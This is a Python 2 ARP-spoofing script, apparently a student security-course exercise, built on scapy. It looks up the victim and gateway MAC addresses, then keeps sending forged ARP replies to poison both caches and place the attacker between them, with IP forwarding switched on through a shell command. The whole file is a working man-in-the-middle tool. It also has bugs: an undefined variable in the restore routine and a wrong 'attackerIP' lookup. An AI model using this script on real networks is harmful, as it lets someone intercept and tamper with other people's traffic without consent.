# -*- encoding: utf-8 -*-

import os
import sys
import netifaces
import time
from scapy.all import*

print "[bob5][포렌식]send_arp[정소연]\n"


'''
1. 자기 자신의 ip, mac을 얻어 온다.

2. gateway의 ip를 알아 온다

3. victim과 gateway에 대해 각각 ARP_REQUEST를 직접 날려서 mac 주소를 물어 보고 그 
응답을 받아서 mac을 구해 온다.

4. ARP infection packet을 victim(sender)에게 날려서 victim(sender)에서 바라 보는 gateway(target) ARP table이 제대로 변조되었는지 확인한다.
'''




# get the MAC address from IP 
def IPtoMAC_trans(IP):
	ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=1, retry=2)
	for s, r in ans:
		return r[Ether].src
	return None



# Send arp reply/request message
def ARP_Send(gatewayIP, victimIP):
	victimMAC = IPtoMAC_trans(victimIP)
	gatewayMAC = IPtoMAC_trans(gatewayIP)
	
	'''
	 op = 1 : request   op = 2 : reply
	 the attacker is placed in the middle of victim and gateway
	 by telling the victim(dst) that the packet is from the gateway(src)
	 and by telling the gateway(dst) that the packet is from the victim(src)
	 both with ARP replying message
	
	pdst: 목적지IP  /  psrc: 출발지IP
	hwdst: 목적지MAC  /  hwsrc: 목적지MAC
	'''
	
	# ARP REPLY: gateway(target) > victim(sender)
	send(ARP(op = 2, psrc = gatewayIP, pdst = victimIP, hwdst = victimMAC ))
	
	# ARP REPLY: victim(sender) > gateway(target)
	send(ARP(op = 2, psrc = victimIP, pdst = gatewayIP, hwdst = gatewayMAC))

	print "  [completed] arp_send\n"
	



# restore the victim and router	
def Restore(gatewayIP, victimIP):
	victimMAC = IPtoMAC_trans(victimIP)
	gatewayMAC = IPtoMAC_trans(gatewayIP)
	
	# setting hwdst as "ff:ff:ff:ff:ff:ff" in arp message so that it can be recognized as a broadcast
	send(ARP(op =2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMac), count = 2)
	send(ARP(op =2, pdst = victimIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 2)



def main():
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	
	print "\n========Start ARP_Send========\n"

	while 1:
		try:
			ARP_Send(gatewayIP, victimIP)
			time.sleep(5)

		# for restoring, hit < Ctrl + z >
		except KeyboardInterrupt:
			Restore(gatewayIP, victimIP)
			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
			sys.exit(1)
			


print "IP address of Victim: "
victimIP = raw_input() 


# get info of interface
iface_temp = get_if_list()
interface = iface_temp[0]
print "   [Interface] ", interface



# get info of gatewayIP & gatewayMAC
gatewayIP_temp = netifaces.gateways()
gatewayIP = gatewayIP_temp['default'][netifaces.AF_INET][0]
gatewayMAC = IPtoMAC_trans(gatewayIP)
print "   [gatewayIP] ", gatewayIP
print "   [gatewayMAC] ", gatewayMAC


	
# get info of attackerIP & attackerMAC
attackerIP = sr1(IP(dst="8.8.8.8")/ICMP()).dst
attackerMAC_temp = [get_if_hwaddr(i) for i in get_if_list()]
attackerMAC = attackerMAC_temp[0]
print "   [attackerIP] ",attackerIP
print "   [attackerMAC] ", attackerMAC



# get info of victimIP & victimMAC
# victimIP = "192.168.231.132"
victimMAC = IPtoMAC_trans(victimIP)
print "   [victimIP] ", victimIP
print "   [victimMAC] ", victimMAC 



if __name__ == "__main__":
	main()
